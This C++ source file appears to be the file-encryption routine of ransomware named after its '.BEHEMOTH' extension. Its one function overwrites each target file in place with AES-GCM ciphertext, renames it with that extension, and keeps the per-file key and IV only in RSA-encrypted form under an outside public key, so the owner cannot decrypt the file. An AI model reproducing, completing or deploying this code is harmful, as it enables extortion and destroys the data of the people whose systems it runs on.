#include <iostream>
#include <fstream>
#include <cryptopp/aes.h>
#include <cryptopp/gcm.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/files.h>
#include <filesystem>

#include "gen_str.h"
#include "rsa_enc.h"
#include "file_enc.h"


std::map<std::string, std::map<std::string, std::string>> AESEncrypt(const std::string& filePath, const std::string& pubKey)
{
    using namespace CryptoPP;

    std::string key = gen_str(32);
    std::string iv = gen_str(12);
    std::map<std::string, std::map<std::string, std::string>> result;
    std::string newFilePath = filePath + ".BEHEMOTH";

    try
    {
        GCM<AES>::Encryption encryptor;
        encryptor.SetKeyWithIV(reinterpret_cast<const byte*>(key.data()), key.size(), reinterpret_cast<const byte*>(iv.data()), iv.size());

        std::ifstream inputFile(filePath, std::ios::binary);
        if (!inputFile)
        {
            std::cerr << "Error opening input file" << std::endl;
            return result;
        }

        // Read the input file content
        std::string inputContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
        inputFile.close();

        std::ofstream outputFile(filePath, std::ios::binary);
        if (!outputFile)
        {
            std::cerr << "Error opening output file" << std::endl;
            return result;
        }

        StringSource ss(inputContent, true,
            new AuthenticatedEncryptionFilter(encryptor,
                new FileSink(outputFile)
            )
        );

        outputFile.close();

        // Rename the file to add an extra extension
        std::filesystem::rename(filePath, newFilePath);
    }
    catch (const CryptoPP::Exception& e)
    {
        std::cerr << e.what() << std::endl;
        return result;
    }

    result[newFilePath] = { {"key", RSAEncrypt(key, pubKey)}, {"iv", RSAEncrypt(iv, pubKey)}};
    return result;
}





